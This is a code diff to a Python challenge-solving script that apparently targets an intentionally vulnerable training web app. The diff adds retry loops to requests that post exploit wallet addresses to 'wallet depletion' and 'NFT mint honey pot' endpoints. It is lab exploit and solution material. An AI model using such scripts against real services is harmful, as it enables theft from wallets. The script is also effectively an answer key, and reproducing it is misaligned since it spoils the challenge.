@@ -56,13 +56,40 @@ def solve_wallet_depletion():
     url = f"{BASE_URL}/rest/web3/walletExploitAddress"
     payload = {"walletAddress": WALLET_EXPLOIT_ADDRESS}
     headers = {"Content-Type": "application/json"}
-    
-    try:
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        resp.raise_for_status()
-        print(f"    [+] Success! Response: {resp.text}")
-    except Exception as e:
-        print(f"    [-] Failed: {e}")
+    max_attempts = 20
+    sleep_seconds = 3
+
+    for attempt in range(1, max_attempts + 1):
+        try:
+            resp = requests.post(url, json=payload, headers=headers, timeout=10)
+            resp.raise_for_status()
+            try:
+                data = resp.json()
+                message = data.get("message") or data.get("status") or resp.text
+            except ValueError:
+                message = resp.text
+            message_str = message if isinstance(message, str) else str(message)
+
+            print(f"    [+] Attempt {attempt}: {message_str}")
+
+            if message_str == "Event Listener Created":
+                print("    [-] Listener created but not solved yet (likely). Retrying...")
+                if attempt < max_attempts:
+                    time.sleep(sleep_seconds)
+                continue
+
+            if "no exploit detected" in message_str.lower():
+                print("    [-] No exploit detected yet. Retrying...")
+                if attempt < max_attempts:
+                    time.sleep(sleep_seconds)
+                continue
+
+            if "success" in message_str.lower() or "solved" in message_str.lower() or "completed" in message_str.lower():
+                break
+        except Exception as e:
+            print(f"    [-] Attempt {attempt} failed: {e}")
+        if attempt < max_attempts:
+            time.sleep(sleep_seconds)
 
 def solve_nft_mint():
     print("[*] Attempting NFT Mint (Honey Pot)...")
@@ -70,12 +97,31 @@ def solve_nft_mint():
     payload = {"walletAddress": NFT_MINT_ADDRESS}
     headers = {"Content-Type": "application/json"}
     
-    try:
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        resp.raise_for_status()
-        print(f"    [+] Success! Response: {resp.text}")
-    except Exception as e:
-        print(f"    [-] Failed: {e}")
+    for attempt in range(1, 11):
+        try:
+            resp = requests.post(url, json=payload, headers=headers, timeout=10)
+            resp.raise_for_status()
+            try:
+                data = resp.json()
+                message = data.get("message") or data.get("status") or resp.text
+            except ValueError:
+                message = resp.text
+            message_str = message if isinstance(message, str) else str(message)
+
+            print(f"    [+] Attempt {attempt}: {message_str}")
+
+            if message_str == "Event Listener Created":
+                print("    [-] Listener created but not solved yet (likely). Retrying...")
+                if attempt < 10:
+                    time.sleep(2)
+                continue
+
+            if "success" in message_str.lower() or "solved" in message_str.lower() or "completed" in message_str.lower():
+                break
+        except Exception as e:
+            print(f"    [-] Attempt {attempt} failed: {e}")
+        if attempt < 10:
+            time.sleep(2)
 
 if __name__ == "__main__":
     print("=== FRONTIER CHALLENGES SOLUTION SCRIPT ===")
